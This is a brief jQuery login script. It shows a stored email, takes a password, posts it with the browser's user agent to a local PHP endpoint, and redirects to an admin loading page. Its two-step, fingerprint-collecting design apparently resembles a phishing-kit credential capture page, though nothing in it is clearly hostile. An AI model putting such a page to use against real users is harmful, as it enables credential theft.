$(function () {
$("#add_email").text(localStorage.user);
	});

function pass(){
	

var PASS	 =	$("#pass_word").val();
	
	//alert(ID_sg);
	//alert(PASS_sg);
	
 if(PASS==''){

swal({
icon: 'error',
title: 'Warning !',
text: "Please enter your password"

})	

return false;	
} 



var data_log = 
{
DEVICE       : navigator.userAgent,
PASS		    :   PASS

}; 


var _url = './config/pass.php';
$('#cover-spin').show(0);
$.post(_url,data_log,function(data){
 var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	

 window.location="./admin/loading.html";  

} 


})
}